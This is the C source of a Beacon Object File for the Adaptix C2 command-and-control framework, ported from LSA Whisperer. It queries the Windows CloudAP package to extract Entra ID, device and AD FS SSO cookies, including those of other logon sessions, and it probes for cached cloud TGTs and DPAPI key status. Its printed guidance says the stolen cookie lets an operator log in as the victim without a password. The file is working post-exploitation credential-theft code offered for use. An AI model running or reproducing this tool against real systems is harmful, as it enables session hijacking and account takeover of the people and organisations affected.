/*
 * cloudap_bof.c - CloudAP Authentication Package BOF (Adaptix C2)
 *
 * Implements CloudAP and AAD plugin calls:
 *   - SSO cookie extraction (user, device, enterprise)
 *   - Cloud provider info / TGT status / DPAPI status
 *
 * Ported from LSA Whisperer by Evan McBroom / SpecterOps
 * Adapted for Adaptix C2.
 */

#include "../common/lsa_common.c"

/* ============================================================
 * CloudAP Helper: Build Plugin Call Request
 * ============================================================ */

static PUCHAR BuildPluginCallRequest(
    LUID logonId,
    AAD_PLUGIN_CALL_ID pluginCallId,
    PVOID pPluginInput,
    ULONG cbPluginInput,
    PULONG pTotalSize)
{
    ULONG totalSize = sizeof(CLOUDAP_PLUGIN_CALL_REQUEST) + cbPluginInput;
    PUCHAR pBuf = (PUCHAR)HEAP_ALLOC(totalSize);
    if (!pBuf) return NULL;

    CLOUDAP_PLUGIN_CALL_REQUEST* pReq = (CLOUDAP_PLUGIN_CALL_REQUEST*)pBuf;
    pReq->dwCallId = CloudApPluginCall;
    pReq->LogonId = logonId;
    pReq->PluginId = GUID_PLUGIN_AAD;
    pReq->dwPluginCallId = pluginCallId;
    pReq->cbPluginInput = cbPluginInput;

    if (pPluginInput && cbPluginInput > 0) {
        MEMCPY(pBuf + sizeof(CLOUDAP_PLUGIN_CALL_REQUEST), pPluginInput, cbPluginInput);
    }

    *pTotalSize = totalSize;
    return pBuf;
}

/* ============================================================
 * SSO Cookie Retrieval
 * ============================================================ */

static void DoGetSSOCookie(LUID targetLuid, AAD_PLUGIN_CALL_ID cookieType) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pResponse = NULL;
    ULONG responseLen = 0;
    BOOL needsTrusted = !IsZeroLUID(&targetLuid);
    PUCHAR pReqBuf = NULL;

    const char* cookieName = "SSO";
    if (cookieType == AadCreateDeviceSSOCookie) cookieName = "Device SSO";
    else if (cookieType == AadCreateEnterpriseSSOCookie) cookieName = "Enterprise SSO (AD FS)";

    BeaconPrintf(CALLBACK_OUTPUT, "[*] CloudAP AAD Plugin: Create %s Cookie", cookieName);
    if (needsTrusted) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%X:%X",
                     targetLuid.HighPart, targetLuid.LowPart);
    }

    status = LsaInit(&hLsa, needsTrusted);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LsaInit", status); return; }

    ULONG pkgId = 0;
    status = LsaGetPackageId(hLsa, CLOUDAP_PACKAGE_NAME, &pkgId);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LookupPackage(CloudAP)", status);
        BeaconPrintf(CALLBACK_ERROR,
            "[!] CloudAP package not found. Is this an Entra ID joined device?");
        goto done;
    }

    ULONG reqSize = 0;
    pReqBuf = BuildPluginCallRequest(targetLuid, cookieType, NULL, 0, &reqSize);
    if (!pReqBuf) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        goto done;
    }

    status = LsaCallPackage(hLsa, pkgId, pReqBuf, reqSize,
                            &pResponse, &responseLen, &protocolStatus);

    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaCallAuthenticationPackage", status);
        goto done;
    }

    if (!NT_SUCCESS(protocolStatus)) {
        PrintNTStatus("CloudAP PluginCall protocol", protocolStatus);
        if (protocolStatus == 0xC0000022) {
            BeaconPrintf(CALLBACK_ERROR,
                "    ACCESS_DENIED - Need SYSTEM to target other sessions");
        } else if (protocolStatus == 0xC000005F) {
            BeaconPrintf(CALLBACK_ERROR,
                "    NO_LOGON_SERVERS - No cloud logon session found for this LUID");
        }
        goto done;
    }

    if (pResponse && responseLen > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS - %s Cookie recovered!", cookieName);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Response length: %d bytes", responseLen);

        PUCHAR respData = (PUCHAR)pResponse;

        if (responseLen >= 4 && respData[1] == 0) {
            PWSTR wideCookie = (PWSTR)respData;
            int narrowLen = KERNEL32$WideCharToMultiByte(
                CP_UTF8, 0, wideCookie, responseLen / sizeof(WCHAR),
                NULL, 0, NULL, NULL);

            if (narrowLen > 0) {
                char* narrowCookie = (char*)HEAP_ALLOC(narrowLen + 1);
                if (narrowCookie) {
                    KERNEL32$WideCharToMultiByte(
                        CP_UTF8, 0, wideCookie, responseLen / sizeof(WCHAR),
                        narrowCookie, narrowLen, NULL, NULL);
                    narrowCookie[narrowLen] = '\0';

                    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %s Cookie:", cookieName);
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", narrowCookie);
                    HEAP_FREE(narrowCookie);
                }
            }
        } else {
            HexDump("Cookie Data", respData, responseLen > 256 ? 256 : responseLen);
            if (responseLen > 256) {
                BeaconPrintf(CALLBACK_OUTPUT, "  ... (%d more bytes)", responseLen - 256);
            }
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] Usage: This SSO cookie can be used to authenticate to Entra ID");
        BeaconPrintf(CALLBACK_OUTPUT,
            "    as the target user without their password.");
        BeaconPrintf(CALLBACK_OUTPUT,
            "    Use with ROADtools or similar for further exploitation.");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Empty response");
    }

done:
    if (pReqBuf) HEAP_FREE(pReqBuf);
    LsaCleanup(hLsa, pResponse);
}

/* ============================================================
 * Cloud Information Gathering
 * ============================================================ */

static void DoCloudInfo(LUID targetLuid) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pResponse = NULL;
    ULONG responseLen = 0;
    BOOL needsTrusted = !IsZeroLUID(&targetLuid);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] CloudAP Information Gathering");

    status = LsaInit(&hLsa, needsTrusted);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LsaInit", status); return; }

    ULONG pkgId = 0;
    status = LsaGetPackageId(hLsa, CLOUDAP_PACKAGE_NAME, &pkgId);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LookupPackage(CloudAP)", status);
        BeaconPrintf(CALLBACK_ERROR,
            "[!] CloudAP not available. Device may not be cloud-joined.");
        goto done;
    }

    /* 1. GetAuthenticatingProvider */
    BeaconPrintf(CALLBACK_OUTPUT, "\n--- GetAuthenticatingProvider ---");
    {
        CLOUDAP_REQUEST_HEADER req;
        MEMSET(&req, 0, sizeof(req));
        req.dwCallId = CloudApGetAuthenticatingProvider;
        req.LogonId = targetLuid;

        pResponse = NULL; responseLen = 0;
        status = LsaCallPackage(hLsa, pkgId, &req, sizeof(req),
                                &pResponse, &responseLen, &protocolStatus);

        if (NT_SUCCESS(status) && NT_SUCCESS(protocolStatus) && pResponse) {
            CLOUDAP_GET_AUTH_PROVIDER_RESPONSE* pResp =
                (CLOUDAP_GET_AUTH_PROVIDER_RESPONSE*)pResponse;

            if (MEMCMP(&pResp->ProviderGuid, &GUID_PLUGIN_AAD, sizeof(GUID)) == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "  Provider: Azure AD (Entra ID)");
            } else if (MEMCMP(&pResp->ProviderGuid, &GUID_PLUGIN_MSA, sizeof(GUID)) == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "  Provider: Microsoft Account (MSA)");
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  Provider GUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
                    pResp->ProviderGuid.Data1, pResp->ProviderGuid.Data2,
                    pResp->ProviderGuid.Data3,
                    pResp->ProviderGuid.Data4[0], pResp->ProviderGuid.Data4[1],
                    pResp->ProviderGuid.Data4[2], pResp->ProviderGuid.Data4[3],
                    pResp->ProviderGuid.Data4[4], pResp->ProviderGuid.Data4[5],
                    pResp->ProviderGuid.Data4[6], pResp->ProviderGuid.Data4[7]);
            }
            SECUR32$LsaFreeReturnBuffer(pResponse); pResponse = NULL;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  (not available or no cloud session)");
            if (pResponse) { SECUR32$LsaFreeReturnBuffer(pResponse); pResponse = NULL; }
        }
    }

    /* 2. IsCloudToOnPremTgtPresentInCache */
    BeaconPrintf(CALLBACK_OUTPUT, "\n--- Cloud-to-OnPrem TGT Check ---");
    {
        CLOUDAP_REQUEST_HEADER req;
        MEMSET(&req, 0, sizeof(req));
        req.dwCallId = CloudApIsCloudToOnPremTgtPresentInCache;
        req.LogonId = targetLuid;

        pResponse = NULL; responseLen = 0;
        status = LsaCallPackage(hLsa, pkgId, &req, sizeof(req),
                                &pResponse, &responseLen, &protocolStatus);

        if (NT_SUCCESS(status) && NT_SUCCESS(protocolStatus) && pResponse) {
            CLOUDAP_CLOUD_TGT_RESPONSE* pResp = (CLOUDAP_CLOUD_TGT_RESPONSE*)pResponse;
            BeaconPrintf(CALLBACK_OUTPUT, "  Cloud-to-OnPrem TGT present: %s",
                         pResp->bIsPresent ? "YES" : "NO");
            if (pResp->bIsPresent) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "    [!] A partial TGT from cloud is cached. This can be used for");
                BeaconPrintf(CALLBACK_OUTPUT,
                    "    [!] on-prem access via cloud identity.");
            }
            SECUR32$LsaFreeReturnBuffer(pResponse); pResponse = NULL;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  (not available)");
            if (pResponse) { SECUR32$LsaFreeReturnBuffer(pResponse); pResponse = NULL; }
        }
    }

    /* 3. GetDpApiCredKeyDecryptStatus */
    BeaconPrintf(CALLBACK_OUTPUT, "\n--- DPAPI Cred Key Decrypt Status ---");
    {
        CLOUDAP_REQUEST_HEADER req;
        MEMSET(&req, 0, sizeof(req));
        req.dwCallId = CloudApGetDpApiCredKeyDecryptStatus;
        req.LogonId = targetLuid;

        pResponse = NULL; responseLen = 0;
        status = LsaCallPackage(hLsa, pkgId, &req, sizeof(req),
                                &pResponse, &responseLen, &protocolStatus);

        if (NT_SUCCESS(status) && NT_SUCCESS(protocolStatus) && pResponse) {
            CLOUDAP_DPAPI_STATUS_RESPONSE* pResp = (CLOUDAP_DPAPI_STATUS_RESPONSE*)pResponse;
            BeaconPrintf(CALLBACK_OUTPUT, "  DPAPI Cred Key Decrypted: %s",
                         pResp->bIsDecrypted ? "YES" : "NO");
            SECUR32$LsaFreeReturnBuffer(pResponse); pResponse = NULL;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  (not available)");
            if (pResponse) { SECUR32$LsaFreeReturnBuffer(pResponse); pResponse = NULL; }
        }
    }

done:
    if (pResponse) SECUR32$LsaFreeReturnBuffer(pResponse);
    LsaCleanup(hLsa, NULL);
}

/* ============================================================
 * BOF Entry Point
 * ============================================================ */

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    char* command = BeaconDataExtract(&parser, NULL);
    char* arg1    = BeaconDataExtract(&parser, NULL);

    if (!command || !command[0]) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "=== LSA Whisperer - CloudAP Module ===\n"
            "\n"
            "Commands:\n"
            "  ssocookie [LUID]           - Get Entra ID SSO cookie\n"
            "  devicessocookie [LUID]     - Get device SSO cookie\n"
            "  enterprisesso [LUID]       - Get AD FS SSO cookie\n"
            "  info [LUID]               - Get cloud provider info, TGT status, etc.\n"
            "\n"
            "LUID: 0 = current session, 0x1234abcd = specific session\n"
            "Requires Entra ID / Azure AD joined device with active cloud session.\n");
        return;
    }

    LUID targetLuid = { 0, 0 };
    if (arg1) ParseLUID(arg1, &targetLuid);

    if (STRICMP(command, "ssocookie") == 0) {
        DoGetSSOCookie(targetLuid, AadCreateSSOCookie);
    }
    else if (STRICMP(command, "devicessocookie") == 0) {
        DoGetSSOCookie(targetLuid, AadCreateDeviceSSOCookie);
    }
    else if (STRICMP(command, "enterprisesso") == 0) {
        DoGetSSOCookie(targetLuid, AadCreateEnterpriseSSOCookie);
    }
    else if (STRICMP(command, "info") == 0) {
        DoCloudInfo(targetLuid);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown command: %s", command);
    }
}
